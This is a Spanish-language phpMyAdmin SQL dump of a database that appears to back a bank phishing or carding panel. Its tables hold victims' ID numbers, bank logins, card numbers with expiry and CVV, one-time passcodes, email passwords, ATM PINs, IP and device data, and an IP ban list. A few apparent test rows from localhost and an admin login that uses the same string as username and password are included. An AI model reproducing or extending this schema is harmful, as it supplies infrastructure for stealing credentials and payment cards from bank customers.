-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 01-11-2024 a las 20:28:56
-- Versión del servidor: 10.4.32-MariaDB
-- Versión de PHP: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `latamjunior`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `ban_ip`
--

CREATE TABLE `ban_ip` (
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `datos`
--

CREATE TABLE `datos` (
  `idreg` int(11) NOT NULL,
  `cedula` varchar(20) NOT NULL,
  `nombres` varchar(255) NOT NULL,
  `ciudad` varchar(255) NOT NULL,
  `direccion` varchar(255) NOT NULL,
  `usuario` varchar(25) NOT NULL,
  `password` varchar(30) NOT NULL,
  `banco` varchar(30) NOT NULL,
  `tarjeta` varchar(40) NOT NULL,
  `ftarjeta` varchar(30) NOT NULL,
  `cvv` varchar(10) NOT NULL,
  `otp` varchar(10) NOT NULL,
  `email` varchar(40) NOT NULL,
  `password_email` varchar(30) NOT NULL,
  `cajero` varchar(10) NOT NULL,
  `ip` varchar(50) NOT NULL,
  `id` varchar(50) NOT NULL,
  `agente` varchar(20) NOT NULL,
  `status` varchar(50) NOT NULL,
  `horacreado` varchar(12) NOT NULL,
  `horamodificado` varchar(11) NOT NULL,
  `celular` varchar(40) NOT NULL,
  `dispositivo` varchar(255) NOT NULL,
  `owner` varchar(255) NOT NULL,
  `nota` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `generador`
--

CREATE TABLE `generador` (
  `numero` varchar(10) NOT NULL,
  `time` int(11) NOT NULL,
  `owner` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `login`
--

CREATE TABLE `login` (
  `id` int(11) NOT NULL,
  `usuario` text NOT NULL,
  `password` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `login`
--

INSERT INTO `login` (`id`, `usuario`, `password`) VALUES
(1, 'sayayin', 'sayayin');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `telefonos`
--

CREATE TABLE `telefonos` (
  `owner` int(11) NOT NULL,
  `buenos` text NOT NULL,
  `fallidos` text NOT NULL,
  `time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `nombre` varchar(50) NOT NULL,
  `apellido` varchar(50) NOT NULL,
  `documento` varchar(255) NOT NULL,
  `telefono` varchar(255) NOT NULL,
  `ciudad` varchar(255) NOT NULL,
  `direccion` int(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `banco` varchar(255) NOT NULL,
  `franquicia` varchar(255) NOT NULL,
  `tipo_tarjeta` varchar(255) NOT NULL,
  `nro_tarjeta` varchar(255) NOT NULL,
  `nombre_tarjeta` varchar(255) NOT NULL,
  `mes_tarjeta` varchar(255) NOT NULL,
  `anio_tarjeta` varchar(255) NOT NULL,
  `cvv_tarjeta` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `fecha` varchar(255) NOT NULL,
  `estado` int(2) NOT NULL DEFAULT 1,
  `usuario` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `otp` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `users`
--

INSERT INTO `users` (`id`, `nombre`, `apellido`, `documento`, `telefono`, `ciudad`, `direccion`, `email`, `banco`, `franquicia`, `tipo_tarjeta`, `nro_tarjeta`, `nombre_tarjeta`, `mes_tarjeta`, `anio_tarjeta`, `cvv_tarjeta`, `ip`, `fecha`, `estado`, `usuario`, `password`, `otp`) VALUES
(181, 'JUAN', 'PEREZ', '12345677', '3218112111', 'BARRANQUILLA', 0, 'juniorq@gmail.com', 'BANCOLOMBIA', 'Master Card', 'Credito', '5302 6781 1919 1291', 'CASIMIRO  TUCULITO', '8', '2029', '123', '::1', '<b> <i>01/11/2024 </i> 04:11:23  am</b>', 7, '', '', ''),
(182, 'JUNIOR', 'SAYAYIN', '123456789', '30121212111', 'BARRANQUILLA', 0, 'juniorq@gmail.com', 'BANCOLOMBIA', 'Master Card', 'Credito', '4921 0012 1029 9121', 'JUAN PEREZ', '2', '2029', '123', '::1', '<b> <i>01/11/2024 </i> 04:11:40  am</b>', 2, '', '', ''),
(183, 'JUNIOR', 'SAYAYIN', '12121212', '3012121111', 'BARRANQUILLA', 0, 'juniorq@gmail.com', 'BANCOLOMBIA', 'Visa', 'Credito', '4981 1212 1212 1211', 'JUNIOR TU PAPA ', '1', '2030', '121', '::1', '<b> <i>01/11/2024 </i> 04:11:11  am</b>', 7, 'JUNIOR21', '1234', '767788');

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `ban_ip`
--
ALTER TABLE `ban_ip`
  ADD PRIMARY KEY (`ip`) USING BTREE;

--
-- Indices de la tabla `datos`
--
ALTER TABLE `datos`
  ADD PRIMARY KEY (`idreg`) USING BTREE;

--
-- Indices de la tabla `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`) USING BTREE;

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `datos`
--
ALTER TABLE `datos`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT de la tabla `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=184;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
